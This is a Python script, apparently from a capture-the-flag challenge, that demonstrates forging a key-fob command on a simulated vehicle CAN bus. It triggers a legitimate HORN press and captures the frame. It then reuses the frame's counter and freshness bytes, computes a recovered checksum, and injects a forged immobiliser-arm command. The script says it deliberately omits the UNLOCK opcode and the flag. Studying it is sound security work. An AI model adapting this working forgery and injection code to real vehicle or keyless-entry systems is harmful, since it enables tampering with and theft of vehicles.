#!/usr/bin/env python3
"""Demonstrate a valid forged *known* Phantom Fob command.

This intentionally forges IMMOB_ARM only. It does not search for or disclose the
missing UNLOCK opcode or the challenge flag.

Usage:
    python3 forge_demo.py TARGET_IP --fob-id 12A --state-id 429
"""

import argparse
import json
import re
import socket
import threading
import time
import urllib.request

FRAME_RE = re.compile(
    rb"< frame ([0-9A-Fa-f]+) ([0-9.]+) ([0-9A-Fa-f]+) >"
)

HORN_OPCODE = 0x19
IMMOB_ARM_OPCODE = 0x3E


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    parser.add_argument("--fob-id", default="12A")
    parser.add_argument("--state-id", default="429")
    parser.add_argument("--bus", default="vcan0")
    parser.add_argument("--can-port", type=int, default=29536)
    parser.add_argument("--web-port", type=int, default=8080)
    args = parser.parse_args()

    fob_id = args.fob_id.upper()
    state_id = args.state_id.upper()
    web = f"http://{args.target}:{args.web_port}"

    fob_frames = []
    state_frames = []
    data_lock = threading.Lock()

    sock = socket.create_connection((args.target, args.can_port), timeout=5)
    sock.settimeout(1)
    print("hello:", sock.recv(1024))
    sock.sendall(f"< open {args.bus} >".encode())
    print("open :", sock.recv(1024))
    sock.sendall(b"< rawmode >")
    print("raw  :", sock.recv(1024))

    def reader() -> None:
        buf = b""
        while True:
            try:
                data = sock.recv(65535)
                if not data:
                    return
                buf += data
                while True:
                    match = FRAME_RE.search(buf)
                    if not match:
                        if len(buf) > 100000:
                            buf = buf[-10000:]
                        break
                    can_id = match.group(1).decode().upper()
                    payload = bytes.fromhex(match.group(3).decode())
                    with data_lock:
                        if can_id == fob_id:
                            fob_frames.append((time.time(), payload))
                        elif can_id == state_id:
                            state_frames.append((time.time(), payload))
                    buf = buf[match.end():]
            except socket.timeout:
                continue

    threading.Thread(target=reader, daemon=True).start()

    def press(button: str) -> None:
        req = urllib.request.Request(
            web + "/press",
            data=json.dumps({"button": button}).encode(),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=3) as response:
            response.read()

    def inject(payload: bytes) -> None:
        command = f"< send {fob_id} 8 " + " ".join(f"{b:02x}" for b in payload) + " >"
        tx = socket.create_connection((args.target, args.can_port), timeout=3)
        tx.recv(1024)
        tx.sendall(f"< open {args.bus} >".encode())
        tx.recv(1024)
        print("[+] Injecting:", command)
        tx.sendall(command.encode())
        tx.close()

    print("\n[+] Capturing a fresh legitimate HORN frame...")
    start = time.time()
    press("HORN")

    fresh = None
    deadline = time.time() + 1
    while time.time() < deadline:
        with data_lock:
            for ts, payload in reversed(fob_frames):
                if ts < start:
                    break
                if len(payload) == 8 and payload[1] == HORN_OPCODE:
                    fresh = payload
                    break
        if fresh is not None:
            break
        time.sleep(0.002)

    if fresh is None:
        raise RuntimeError("Could not capture a fresh HORN frame")

    print("[+] Fresh frame:", " ".join(f"{b:02x}" for b in fresh))

    next_counter = (fresh[0] + 1) & 0xFF
    freshness_a = fresh[2]
    freshness_b = fresh[5]

    # Recovered checksum relationship from the CTF:
    # checksum = counter + command + freshness_a + freshness_b + 0x20 (mod 256)
    checksum = (
        next_counter
        + IMMOB_ARM_OPCODE
        + freshness_a
        + freshness_b
        + 0x20
    ) & 0xFF

    forged = bytes(
        [
            next_counter,
            IMMOB_ARM_OPCODE,
            freshness_a,
            0xB0,
            checksum,
            freshness_b,
            0x48,
            0xEF,
        ]
    )

    print("[+] Forged known ARM command:", " ".join(f"{b:02x}" for b in forged))
    inject(forged)

    print(f"[+] Watching {state_id} for about 1.5 seconds...")
    end = time.time() + 1.5
    seen = set()
    while time.time() < end:
        with data_lock:
            current = list(state_frames[-12:])
        for _, payload in current:
            if payload not in seen:
                seen.add(payload)
                print(
                    f"    {state_id}",
                    " ".join(f"{b:02x}" for b in payload),
                )
        time.sleep(0.02)

    print("\n[+] Demo complete. Final UNLOCK opcode/search intentionally omitted.")
    sock.close()


if __name__ == "__main__":
    main()
